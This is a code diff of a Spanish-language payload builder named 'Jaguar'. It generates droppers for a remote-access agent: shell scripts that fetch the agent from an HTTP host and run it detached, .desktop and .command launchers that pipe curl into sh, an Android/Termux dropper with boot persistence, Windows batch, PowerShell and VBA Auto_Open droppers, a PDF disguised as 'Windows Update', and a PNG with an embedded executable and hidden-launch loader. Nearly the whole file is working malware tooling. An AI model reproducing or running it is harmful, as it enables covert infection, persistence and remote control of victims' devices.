@@ -1,14 +1,22 @@
 # -*- coding: utf-8 -*-
-"""Constructor de payloads Jaguar (droppers + pipeline ofuscado).
+"""Constructor de payloads Jaguar (multiplataforma: Windows / Linux / macOS).
 
 Cadena de ofuscacion/compilacion del exe:
   1) PyArmor  -> ofusca el agente
   2) Nuitka   -> compila (recomendado)
   3) PyInstaller -> fallback
 
-Los payloads de script son DROPPERS: descargan el exe por HTTP y lo ejecutan
-OCULTO. Si no hay exe, el fallback descarga el .py (con host incrustado) y lo
-corre con pythonw. Todos los payloads llevan el host/fallback embebidos.
+OJO: PyInstaller/Nuitka NO cross-compilan. El binario se produce para el SO
+donde ejecutes el builder. Para tener .exe + ELF + Mach-O hay que compilar en
+cada uno.
+
+Formatos y su alcance:
+  .py       -> UNIVERSAL (Windows/Linux/macOS/Android-Termux). Base real.
+  .sh       -> dropper Linux / macOS / Termux
+  .desktop  -> lanzador Linux
+  .command  -> lanzador macOS
+  .exe      -> binario Windows (solo si compilas en Windows)
+  .bat .vbs .lnk .hta .pdf .png .bas -> droppers Windows
 """
 import functools
 import os
@@ -23,6 +31,9 @@ import zlib
 from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
 
 ES_WIN = sys.platform.startswith("win")
+ES_LINUX = sys.platform.startswith("linux")
+ES_MAC = sys.platform.startswith("darwin")
+SO = "windows" if ES_WIN else ("linux" if ES_LINUX else ("macos" if ES_MAC else "otro"))
 CREATE_NO_WINDOW = 0x08000000
 
 DEPS_STDLIB = ["io", "time", "base64", "socket", "getpass", "platform", "shutil"]
@@ -78,40 +89,6 @@ class Constructor:
                 return c
         self.log(f"[builder] ERROR: no encontré agente.py (busqué en {self.raiz})")
         return None
-    
-    def generar_png_stego(self):
-        """PNG real (logo) con el exe anexado tras IEND + loader .cmd fileless."""
-        carrier = None
-        for c in (os.path.join(self.raiz, "jaguar", "ui", "jaguar.png"),
-                  os.path.join(self.raiz, "img", "jaguar.png")):
-            if os.path.isfile(c):
-                carrier = c
-                break
-        png = open(carrier, "rb").read() if carrier else self._png_minimo()
-
-        exe = self._out(self.nombre + ".exe")
-        datos = open(exe, "rb").read() if os.path.isfile(exe) else b""
-        if not datos:
-            self.log("[builder] aviso: no hay exe; genera el .exe antes del stego")
-
-        MAGIC = b"JAGUARSTEGO"
-        blob = png + datos + MAGIC + len(datos).to_bytes(8, "little")
-        self._escribir(self._out(self.nombre + ".png"), blob, binario=True)
-
-        loader = "\r\n".join([
-            "@echo off",
-            'set "IMG=%~dp0%~n0"',
-            'powershell -NoP -C "$b=[IO.File]::ReadAllBytes($env:IMG);'
-            "$m=[Text.Encoding]::ASCII.GetBytes('JAGUARSTEGO');"
-            "$i=$b.Length-8; $n=[BitConverter]::ToInt64($b,$i);"
-            "$x=New-Object byte[] $n; [Array]::Copy($b,$i-$n,$x,0,$n);"
-            "$d=Join-Path $env:TEMP 'jaguar_stego.exe';"
-            "[IO.File]::WriteAllBytes($d,$x); Start-Process $d -WindowStyle Hidden\"",
-            "exit /b",
-        ]) + "\r\n"
-        self._escribir(self._out(self.nombre + ".png.cmd"), loader)
-        self.log("[builder] png estego listo (payload embebido, imagen visible normal)")
-        return self._out(self.nombre + ".png")
 
     @staticmethod
     def _ip_local():
@@ -131,11 +108,17 @@ class Constructor:
             h = self.fallback or h or "127.0.0.1"
         return h
 
+    def _url(self, archivo):
+        return f"http://{self._host_url()}:{self.puerto_http}/{archivo}"
+
     def _url_exe(self):
-        return f"http://{self._host_url()}:{self.puerto_http}/{self.nombre}.exe"
+        return self._url(self.nombre + (".exe" if ES_WIN else ""))
 
     def _url_py(self):
-        return f"http://{self._host_url()}:{self.puerto_http}/{self.nombre}.py"
+        return self._url(self.nombre + ".py")
+
+    def _url_sh(self):
+        return self._url(self.nombre + ".sh")
 
     def _out(self, nombre):
         return os.path.join(self.dist, nombre)
@@ -145,6 +128,13 @@ class Constructor:
         kwargs = {} if binario else {"encoding": "utf-8", "newline": ""}
         with open(ruta, modo, **kwargs) as f:
             f.write(texto)
+        try:
+            if not binario and ruta.endswith((".sh", ".command")):
+                os.chmod(ruta, 0o755)
+            if ruta.endswith(".desktop"):
+                os.chmod(ruta, 0o755)
+        except Exception:
+            pass
         self.log(f"[builder] creado: {os.path.basename(ruta)}")
         return ruta
 
@@ -217,7 +207,7 @@ class Constructor:
     # ------------------------------------------------------------------ icono
     def _icono_ico(self):
         if self.icono and os.path.isfile(self.icono):
-            if self.icono.lower().endswith(".ico"):
+            if self.icono.lower().endswith((".ico", ".png")):
                 return os.path.abspath(self.icono)
             try:
                 from PIL import Image
@@ -232,16 +222,17 @@ class Constructor:
             if not os.path.isfile(p):
                 p = os.path.join(self.raiz, "img", cand)
             if os.path.isfile(p):
-                if p.lower().endswith(".ico"):
+                if p.lower().endswith((".ico", ".png")):
                     return p
                 try:
                     from PIL import Image
                     destino = os.path.join(self.dist, self.nombre + ".ico")
                     Image.open(p).convert("RGBA").save(
-                        destino, sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (256, 256)])
+                        destino, sizes=[(16, 16), (32, 32), (48, 48), (64, 64),
+                                        (256, 256)])
                     return destino
                 except Exception as e:
-                    self.log(f"[builder] no pude convertir icono: {e}")
+                    self.log(f"[builder] no pudo convertir icono: {e}")
         return None
 
     # ------------------------------------------------------------------ entry
@@ -258,15 +249,7 @@ class Constructor:
             "except Exception:\n"
             "    pass\n"
         )
-        return (
-            "import os, sys, subprocess\n"
-            "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
-            f"_HOST = {self.host!r}\n"
-            f"_PORT = {self.puerto!r}\n"
-            f"_HOST2 = {self.fallback!r}\n"
-            "os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
-            "os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
-            "os.environ.setdefault('JAGUAR_HOST2', _HOST2)\n"
+        desprender = (
             "DETACHED_PROCESS = 0x00000008\n"
             "CREATE_NEW_PROCESS_GROUP = 0x00000200\n"
             "CREATE_NO_WINDOW = 0x08000000\n"
@@ -281,12 +264,30 @@ class Constructor:
             "    subprocess.Popen(\n"
             "        [sys.executable, '--jaguar-detached', _HOST, _PORT],\n"
             "        env=_entorno_limpio(),\n"
-            "        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,\n"
+            "        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | "
+            "CREATE_NO_WINDOW,\n"
             "        close_fds=True)\n"
             "    sys.exit(0)\n"
-            "sys.argv = [sys.argv[0], _HOST, _PORT, _HOST2]\n"
-            + calentamiento +
-            "import agente_jaguar as agente\n"
+            "elif not sys.platform.startswith('win') and '--jaguar-detached' not in sys.argv:\n"
+            "    try:\n"
+            "        if os.fork() != 0:\n"
+            "            sys.exit(0)\n"
+            "    except Exception:\n"
+            "        pass\n"
+        )
+        return (
+            "import os, sys, subprocess\n"
+            "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
+            f"_HOST = {self.host!r}\n"
+            f"_PORT = {self.puerto!r}\n"
+            f"_HOST2 = {self.fallback!r}\n"
+            "os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
+            "os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
+            "os.environ.setdefault('JAGUAR_HOST2', _HOST2)\n"
+            + desprender
+            + "sys.argv = [sys.argv[0], _HOST, _PORT, _HOST2]\n"
+            + calentamiento
+            + "import agente_jaguar as agente\n"
             "agente.main()\n"
         )
 
@@ -329,7 +330,8 @@ class Constructor:
         for args in intentos:
             try:
                 proc = subprocess.run([sys.executable, "-m", "pyarmor.cli"] + args,
-                                      cwd=self.build, capture_output=True, text=True, **_sc())
+                                      cwd=self.build, capture_output=True, text=True,
+                                      **_sc())
             except Exception as e:
                 self.log(f"[builder] PyArmor excepción: {e}")
                 continue
@@ -354,6 +356,9 @@ class Constructor:
         return runtime
 
     # ------------------------------------------------------------------ exe
+    def _nombre_binario(self):
+        return self.nombre + (".exe" if ES_WIN else "")
+
     def generar_exe(self):
         try:
             if not self.agente or not os.path.isfile(self.agente):
@@ -372,7 +377,8 @@ class Constructor:
                 if self._tiene_pyarmor():
                     runtime = self._obfuscar_pyarmor()
                     if runtime:
-                        shutil.copy2(self.agente, os.path.join(self.build, "agente_deps.py"))
+                        shutil.copy2(self.agente, os.path.join(self.build,
+                                                               "agente_deps.py"))
                         deps = "agente_deps"
                         self.log("[builder] agente_deps.py -> análisis de dependencias")
                 else:
@@ -400,7 +406,7 @@ class Constructor:
 
             destino = self._colocar_exe(origen)
             self._firmar(destino)
-            self.log(f"[builder] exe listo: {os.path.basename(destino)}")
+            self.log(f"[builder] binario listo ({SO}): {os.path.basename(destino)}")
             self._limpiar_builds_viejos(conservar=(os.path.basename(work),
                                                    os.path.basename(dist_tmp)))
             return destino
@@ -439,7 +445,7 @@ class Constructor:
             cmd.append("--lto=yes")
         ico = self._icono_ico()
         if ico:
-            cmd.append(f"--windows-icon-from-ico={ico}")
+            cmd.append(f"--windows-icon-from-ico={ico}" if ES_WIN else f"--icon={ico}")
         cmd += list(extra)
         cmd.append("_entry.py")
         return cmd
@@ -464,10 +470,13 @@ class Constructor:
         return p.returncode, "\n".join(ultimas)
 
     def _compilar_nuitka(self, dist_tmp, work, runtime, deps):
-        exe = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
-        intentos = [["--mingw64"]] if self.mingw else [[], ["--mingw64"]]
+        exe = os.path.join(dist_tmp, self._nombre_binario())
+        intentos = [["--mingw64"]] if (self.mingw and ES_WIN) else [[], ["--mingw64"]]
+        if not ES_WIN:
+            intentos = [[]]
         for extra in intentos:
-            self.log(f"[builder] compilando con Nuitka {extra or '[MSVC]'}... (varios minutos)")
+            self.log(f"[builder] compilando con Nuitka {extra or '[nativo]'}... "
+                     "(varios minutos)")
             try:
                 rc, cola = self._correr_stream(
                     self._nuitka_cmd(dist_tmp, extra, runtime, deps), self.build)
@@ -480,19 +489,21 @@ class Constructor:
         return None
 
     def _compilar_pyinstaller(self, dist_tmp, work, runtime, deps, intentos=3):
-        exe = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
+        exe = os.path.join(dist_tmp, self._nombre_binario())
         ocultos = ["PIL", "PIL.Image", "PIL.ImageGrab", "cv2"] + DEPS_STDLIB + ["subprocess"]
         if ES_WIN:
             ocultos.append("winreg")
         salida = ""
         for i in range(intentos):
             cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm",
-                   "--onefile", "--noconsole", "--clean",
+                   "--onefile", "--clean",
                    "--name", self.nombre,
                    "--distpath", dist_tmp,
                    "--workpath", work,
                    "--specpath", work,
                    "--paths", self.build]
+            if ES_WIN:
+                cmd.append("--noconsole")
             for m in ocultos:
                 cmd += ["--hidden-import", m]
             if deps:
@@ -571,9 +582,19 @@ class Constructor:
         except Exception as e:
             self.log(f"[builder] ERROR firma: {e}")
 
-    # ------------------------------------------------------------------ droppers
+    # ================================================================ UNIVERSAL
+    def generar_py(self):
+        """Un .py AUTONOMO con el host incrustado. Sirve en Windows/Linux/macOS/Android."""
+        try:
+            with open(self.agente, encoding="utf-8", errors="replace") as f:
+                fuente = f.read()
+        except Exception as e:
+            self.log(f"[builder] ERROR py: {e}")
+            return None
+        return self._escribir(self._out(self.nombre + ".py"),
+                              self._cabecera_arranque() + "\n" + fuente)
+
     def _bat_compacto(self):
-        """Batch minimo (para polyglot PDF). Sin consola residual."""
         return (
             "@echo off\r\n"
             f"set U={self._url_exe()}\r\n"
@@ -583,26 +604,141 @@ class Constructor:
             'if exist "%D%" (start "" "%D%" & exit /b)\r\n'
             f"set PY={self._url_py()}\r\n"
             'set PYD=%TEMP%\\jaguar_py.py\r\n'
-            'powershell -NoP -C "try{Invoke-WebRequest -UseBasicParsing -Uri \'%PY%\' -OutFile \'%PYD%\'}catch{}" >nul 2>&1\r\n'
+            'powershell -NoP -C "try{Invoke-WebRequest -UseBasicParsing -Uri \'%PY%\' '
+            "-OutFile '%PYD%'}catch{}\" >nul 2>&1\r\n"
             'where pythonw >nul 2>&1 && start "" pythonw "%PYD%"\r\n'
             "exit /b\r\n"
         )
 
+    # ================================================================ LINUX / MAC
+    def generar_sh(self):
+        """Dropper shell: funciona en Linux, macOS y Termux (Android).
+
+        Prioridad: binario local del SO -> .py con host incrustado.
+        Detecta python3/python y curl/wget. Se desprende con nohup/setsid.
+        """
+        nombre_py = self.nombre + ".py"
+        L = [
+            "#!/bin/sh",
+            "# Jaguar dropper (Linux / macOS / Termux)",
+            f'URL_BIN="{self._url(self.nombre)}"',
+            f'URL_PY="{self._url(nombre_py)}"',
+            'DEST="$HOME/.jaguar_agente.py"',
+            'BIN="$HOME/.jaguar_agente_bin"',
+            'AGO="--jaguar-detached"',
+            "",
+            "_bajar() {",
+            '  if command -v curl >/dev/null 2>&1; then curl -fsSL "$1" -o "$2" 2>/dev/null; return $?; fi',
+            '  if command -v wget >/dev/null 2>&1; then wget -qO "$2" "$1" 2>/dev/null; return $?; fi',
+            '  return 1',
+            "}",
+            "",
+            "# 1) binario nativo del SO (si el builder lo genero para esta plataforma)",
+            'if _bajar "$URL_BIN" "$BIN" && [ -s "$BIN" ]; then',
+            '  chmod +x "$BIN" 2>/dev/null',
+            '  if "$BIN" --version >/dev/null 2>&1 || true; then',
+            '    (setsid "$BIN" $AGO >/dev/null 2>&1 &) 2>/dev/null || '
+            '(nohup "$BIN" $AGO >/dev/null 2>&1 &)',
+            "    exit 0",
+            "  fi",
+            "fi",
+            "",
+            "# 2) fallback universal: el .py",
+            "PY=\"\"",
+            'for c in python3 python; do command -v $c >/dev/null 2>&1 && PY=$c && break; done',
+            'if [ -z "$PY" ]; then',
+            '  echo "[jaguar] no hay python; instala python3 y reintenta"',
+            "  exit 1",
+            "fi",
+            '_bajar "$URL_PY" "$DEST" || exit 1',
+            'chmod +x "$DEST" 2>/dev/null',
+            '(setsid "$PY" "$DEST" $AGO >/dev/null 2>&1 &) 2>/dev/null || '
+            'nohup "$PY" "$DEST" $AGO >/dev/null 2>&1 &',
+            "exit 0",
+            "",
+        ]
+        return self._escribir(self._out(self.nombre + ".sh"), "\n".join(L))
+
+    def generar_desktop(self):
+        """Lanzador .desktop para Linux (doble clic). Autocontenido via curl."""
+        contenido = "\n".join([
+            "[Desktop Entry]",
+            "Type=Application",
+            f"Name={self.nombre}",
+            "Comment=Jaguar agent",
+            "Terminal=false",
+            f"Icon={self._icono_ico() or 'utilities-terminal'}",
+            f'Exec=sh -c "curl -fsSL \'{self._url_sh()}\' | sh"',
+            "Categories=Utility;",
+            "StartupNotify=false",
+            "",
+        ])
+        return self._escribir(self._out(self.nombre + ".desktop"), contenido)
+
+    def generar_command(self):
+        """Lanzador .command para macOS (doble clic en Finder)."""
+        contenido = "\n".join([
+            "#!/bin/sh",
+            "# Jaguar dropper (macOS)",
+            'cd "$(dirname "$0")" || exit 1',
+            f'LOCAL="./{self.nombre}.sh"',
+            'if [ -f "$LOCAL" ]; then sh "$LOCAL"; exit 0; fi',
+            f'curl -fsSL "{self._url_sh()}" -o /tmp/.jaguar.sh 2>/dev/null '
+            '|| exit 1',
+            'sh /tmp/.jaguar.sh',
+            "",
+        ])
+        return self._escribir(self._out(self.nombre + ".command"), contenido)
+
+    def generar_android(self):
+        """Dropper especifico Termux: pide storage, baja el .py y lo deja en boot."""
+        contenido = "\n".join([
+            "#!/data/data/com.termux/files/usr/bin/sh",
+            "# Jaguar dropper (Android / Termux)",
+            "# Requiere: pkg install python termux-api && termux-setup-storage",
+            f'URL_PY="{self._url_py()}"',
+            'DEST="$HOME/.jaguar_agente.py"',
+            "",
+            "command -v python >/dev/null 2>&1 || { "
+            "pkg install -y python >/dev/null 2>&1; }",
+            "command -v termux-battery-status >/dev/null 2>&1 || { "
+            "pkg install -y termux-api >/dev/null 2>&1; }",
+            "",
+            'curl -fsSL "$URL_PY" -o "$DEST" || '
+            'wget -qO "$DEST" "$URL_PY" || exit 1',
+            'chmod +x "$DEST" 2>/dev/null',
+            "",
+            "# persistencia: Termux:Boot",
+            'BOOT="$HOME/.termux/boot"',
+            'mkdir -p "$BOOT"',
+            'printf \'#!/data/data/com.termux/files/usr/bin/sh\\n'
+            'termux-wake-lock\\npython $HOME/.jaguar_agente.py &\\n\' > "$BOOT/jaguar.sh"',
+            'chmod +x "$BOOT/jaguar.sh"',
+            "",
+            "termux-wake-lock 2>/dev/null",
+            'nohup python "$DEST" >/dev/null 2>&1 &',
+            "exit 0",
+            "",
+        ])
+        return self._escribir(self._out(self.nombre + ".android.sh"), contenido)
+
+    # ================================================================ WINDOWS
     def generar_bat(self):
-        """Un solo .bat autonomo: exe por HTTP, fallback .py con host incrustado."""
-        exe_url = self._url_exe()
-        py_url = self._url_py()
         L = [
             "@echo off",
             "setlocal enableextensions",
-            f'set "URL={exe_url}"',
+            f'set "URL={self._url_exe()}"',
             f'set "DEST=%TEMP%\\{self.nombre}.exe"',
-            'powershell -NoProfile -ExecutionPolicy Bypass -Command "try{[Net.ServicePointManager]::SecurityProtocol=3072;Invoke-WebRequest -UseBasicParsing -Uri \'%URL%\' -OutFile \'%DEST%\'}catch{}" >nul 2>&1',
+            'powershell -NoProfile -ExecutionPolicy Bypass -Command '
+            '"try{[Net.ServicePointManager]::SecurityProtocol=3072;'
+            "Invoke-WebRequest -UseBasicParsing -Uri '%URL%' -OutFile '%DEST%'}catch{}\""
+            " >nul 2>&1",
             'if exist "%DEST%" (start "" "%DEST%" & exit /b)',
-            "rem --- fallback: .py con host incrustado (necesita Python en la victima) ---",
-            f'set "PYURL={py_url}"',
+            "rem --- fallback: .py con host incrustado ---",
+            f'set "PYURL={self._url_py()}"',
             'set "PYDEST=%TEMP%\\jaguar_agente.py"',
-            'powershell -NoProfile -Command "try{Invoke-WebRequest -UseBasicParsing -Uri \'%PYURL%\' -OutFile \'%PYDEST%\'}catch{}" >nul 2>&1',
+            'powershell -NoProfile -Command "try{Invoke-WebRequest -UseBasicParsing '
+            "-Uri '%PYURL%' -OutFile '%PYDEST%'}catch{}\" >nul 2>&1",
             'where pythonw >nul 2>&1 && start "" pythonw "%PYDEST%"',
             "exit /b",
         ]
@@ -647,17 +783,23 @@ class Constructor:
             "$ErrorActionPreference='SilentlyContinue'",
             f"$url='{self._url_exe()}'",
             f"$dest=Join-Path $env:TEMP '{self.nombre}.exe'",
-            "try{[Net.ServicePointManager]::SecurityProtocol=3072; Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $dest}catch{}",
+            "try{[Net.ServicePointManager]::SecurityProtocol=3072; "
+            "Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $dest}catch{}",
             "if (Test-Path $dest) { Start-Process -FilePath $dest -WindowStyle Hidden }",
             "else {",
-            f"  $py=Join-Path $env:TEMP 'jaguar_agente.py'",
-            f"  try{{Invoke-WebRequest -UseBasicParsing -Uri '{self._url_py()}' -OutFile $py}}catch{{}}",
-            "  if (Test-Path $py) { Start-Process pythonw -ArgumentList $py -WindowStyle Hidden }",
+            "  $py=Join-Path $env:TEMP 'jaguar_agente.py'",
+            f"  try{{Invoke-WebRequest -UseBasicParsing -Uri '{self._url_py()}' "
+            "-OutFile $py}catch{}",
+            "  if (Test-Path $py) { Start-Process pythonw -ArgumentList $py "
+            "-WindowStyle Hidden }",
             "}",
         ]) + "\r\n"
         return self._escribir(self._out(self.nombre + ".ps1"), ps)
 
     def generar_lnk(self):
+        if not ES_WIN:
+            self.log("[builder] .lnk requiere Windows; uso .desktop/.sh")
+            return self.generar_sh()
         destino = self._out(self.nombre + ".lnk")
         comando = (f'powershell -NoP -W Hidden -C "iwr \'{self._url_exe()}\' -OutFile '
                    f'$env:TEMP\\{self.nombre}.exe; Start-Process $env:TEMP\\{self.nombre}.exe"')
@@ -692,7 +834,8 @@ class Constructor:
         )
         with open(vbs, "w", encoding="utf-8") as f:
             f.write(contenido)
-        subprocess.run(["cscript", "//nologo", vbs], capture_output=True, text=True, **_sc())
+        subprocess.run(["cscript", "//nologo", vbs], capture_output=True, text=True,
+                       **_sc())
         self.log(f"[builder] creado: {os.path.basename(destino)}")
         return destino
 
@@ -723,13 +866,6 @@ class Constructor:
         )
         return self._escribir(self._out(self.nombre + ".hta"), hta)
 
-    def generar_png_polyglot(self):
-        """PNG valido + batch anexado. El EJECUTABLE es el .png.cmd."""
-        png = self._png_minimo()
-        cola = b"\r\n" + self._bat_compacto().encode("utf-8")
-        self._escribir(self._out(self.nombre + ".png"), png + cola, binario=True)
-        return self._escribir(self._out(self.nombre + ".png.cmd"), png + cola, binario=True)
-
     @staticmethod
     def _png_minimo():
         def chunk(tipo, data):
@@ -740,12 +876,43 @@ class Constructor:
         idat = zlib.compress(b"\x00\xff\x00\x00")
         return sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
 
-    def generar_pdf(self):
-        """PDF + batch embebido. El EJECUTABLE es el .pdf.cmd."""
-        bat = self._bat_compacto().encode("utf-8")
-        pdf = self._pdf_minimo("Jaguar - Windows Update", prefijo=bat)
-        self._escribir(self._out(self.nombre + ".pdf"), pdf, binario=True)
-        return self._escribir(self._out(self.nombre + ".pdf.cmd"), pdf, binario=True)
+    def generar_png_polyglot(self):
+        png = self._png_minimo()
+        cola = b"\r\n" + self._bat_compacto().encode("utf-8")
+        self._escribir(self._out(self.nombre + ".png"), png + cola, binario=True)
+        return self._escribir(self._out(self.nombre + ".png.cmd"), png + cola,
+                              binario=True)
+
+    def generar_png_stego(self):
+        carrier = None
+        for c in (os.path.join(self.raiz, "jaguar", "ui", "jaguar.png"),
+                  os.path.join(self.raiz, "img", "jaguar.png")):
+            if os.path.isfile(c):
+                carrier = c
+                break
+        with open(carrier, "rb") as f:
+            png = f.read() if carrier else self._png_minimo()
+        exe = self._out(self.nombre + ".exe")
+        datos = open(exe, "rb").read() if os.path.isfile(exe) else b""
+        if not datos:
+            self.log("[builder] aviso: no hay exe; genera el .exe antes del stego")
+        MAGIC = b"JAGUARSTEGO"
+        blob = png + datos + MAGIC + len(datos).to_bytes(8, "little")
+        self._escribir(self._out(self.nombre + ".png"), blob, binario=True)
+        loader = "\r\n".join([
+            "@echo off",
+            'set "IMG=%~dp0%~n0"',
+            'powershell -NoP -C "$b=[IO.File]::ReadAllBytes($env:IMG);'
+            "$m=[Text.Encoding]::ASCII.GetBytes('JAGUARSTEGO');"
+            "$i=$b.Length-8; $n=[BitConverter]::ToInt64($b,$i);"
+            "$x=New-Object byte[] $n; [Array]::Copy($b,$i-$n,$x,0,$n);"
+            "$d=Join-Path $env:TEMP 'jaguar_stego.exe';"
+            "[IO.File]::WriteAllBytes($d,$x); Start-Process $d -WindowStyle Hidden\"",
+            "exit /b",
+        ]) + "\r\n"
+        self._escribir(self._out(self.nombre + ".png.cmd"), loader)
+        self.log("[builder] png estego listo")
+        return self._out(self.nombre + ".png")
 
     @staticmethod
     def _pdf_minimo(texto, prefijo=b""):
@@ -757,9 +924,10 @@ class Constructor:
             None,
             b"<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>",
         ]
-        stream = b"BT /F1 10 Tf 12 60 Td (" + texto.encode("latin-1", "replace") + b") Tj ET"
-        objs[3] = (b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" +
-                   stream + b"\nendstream")
+        stream = (b"BT /F1 10 Tf 12 60 Td ("
+                  + texto.encode("latin-1", "replace") + b") Tj ET")
+        objs[3] = (b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n"
+                   + stream + b"\nendstream")
         out = bytearray(prefijo)
         out += b"%PDF-1.4\n"
         offsets = []
@@ -770,15 +938,21 @@ class Constructor:
         out += b"xref\n0 " + str(len(objs) + 1).encode() + b"\n0000000000 65535 f \n"
         for off in offsets:
             out += ("%010d 00000 n \n" % off).encode()
-        out += (b"trailer\n<< /Size " + str(len(objs) + 1).encode() +
-                b" /Root 1 0 R >>\nstartxref\n" + str(xref).encode() + b"\n%%EOF")
+        out += (b"trailer\n<< /Size " + str(len(objs) + 1).encode()
+                + b" /Root 1 0 R >>\nstartxref\n" + str(xref).encode() + b"\n%%EOF")
         return bytes(out)
+
+    def generar_pdf(self):
+        bat = self._bat_compacto().encode("utf-8")
+        pdf = self._pdf_minimo("Jaguar - Windows Update", prefijo=bat)
+        self._escribir(self._out(self.nombre + ".pdf"), pdf, binario=True)
+        return self._escribir(self._out(self.nombre + ".pdf.cmd"), pdf, binario=True)
 
     def generar_macro(self):
         macro = (
             "Sub Auto_Open()\r\n"
             "    Dim x As Object, s As Object, sh As Object\r\n"
-            f'    Dim url As String, dest As String\r\n'
+            "    Dim url As String, dest As String\r\n"
             f'    url = "{self._url_exe()}"\r\n'
             f'    dest = Environ("TEMP") & "\\{self.nombre}.exe"\r\n'
             "    On Error Resume Next\r\n"
@@ -796,28 +970,22 @@ class Constructor:
         )
         return self._escribir(self._out(self.nombre + "_macro.bas"), macro)
 
-    def generar_py(self):
-        """Un .py AUTONOMO con el host incrustado (conecta en cualquier red)."""
-        try:
-            with open(self.agente, encoding="utf-8", errors="replace") as f:
-                fuente = f.read()
-        except Exception as e:
-            self.log(f"[builder] ERROR py: {e}")
-            return None
-        return self._escribir(self._out(self.nombre + ".py"),
-                              self._cabecera_arranque() + "\n" + fuente)
-
     # ------------------------------------------------------------------ todo
     def generar_todo(self, tipos=None):
-        tipos = tipos or ["exe", "py", "bat", "vbs", "ps1", "lnk", "hta", "pdf",
-                          "png", "macro"]
-        res = {}
+        if tipos is None:
+            tipos = ["py", "sh", "exe", "desktop", "command", "android"]
+            if ES_WIN:
+                tipos += ["bat", "vbs", "ps1", "lnk", "hta", "pdf", "png", "macro"]
         mapa = {
-            "exe": self.generar_exe, "py": self.generar_py, "bat": self.generar_bat,
-            "vbs": self.generar_vbs, "ps1": self.generar_ps1, "lnk": self.generar_lnk,
-            "hta": self.generar_hta, "png": self.generar_png_polyglot,"png_stego": self.generar_png_stego,
+            "py": self.generar_py, "sh": self.generar_sh, "exe": self.generar_exe,
+            "desktop": self.generar_desktop, "command": self.generar_command,
+            "android": self.generar_android,
+            "bat": self.generar_bat, "vbs": self.generar_vbs, "ps1": self.generar_ps1,
+            "lnk": self.generar_lnk, "hta": self.generar_hta,
+            "png": self.generar_png_polyglot, "png_stego": self.generar_png_stego,
             "pdf": self.generar_pdf, "macro": self.generar_macro,
         }
+        res = {}
         for t in tipos:
             fn = mapa.get(t)
             if not fn:
@@ -827,8 +995,10 @@ class Constructor:
             except Exception as e:
                 self.log(f"[builder] ERROR generando {t}: {e}")
                 res[t] = None
-        self.log(f"[builder] host de retorno = {self._host_url()} | fallback LAN = {self.fallback}")
-        self.log("[builder] recuerda: deja '🌐 Servir dist' ACTIVO para que los droppers conecten")
+        self.log(f"[builder] SO del builder = {SO}")
+        self.log(f"[builder] host de retorno = {self._host_url()} | "
+                 f"fallback LAN = {self.fallback}")
+        self.log("[builder] recuerda: deja '🌐 Servir dist' ACTIVO")
         return res
 
     # ------------------------------------------------------------------ http
@@ -862,7 +1032,8 @@ class Servidor:
         self.detener()
         handler = functools.partial(_Handler, directorio=directorio)
         self.httpd = ThreadingHTTPServer(("0.0.0.0", self.puerto), handler)
-        self.hilo = __import__("threading").Thread(target=self.httpd.serve_forever, daemon=True)
+        self.hilo = __import__("threading").Thread(target=self.httpd.serve_forever,
+                                                   daemon=True)
         self.hilo.start()
         self.log(f"[servidor] sirviendo {directorio} en http://0.0.0.0:{self.puerto}")
         return f"http://0.0.0.0:{self.puerto}"
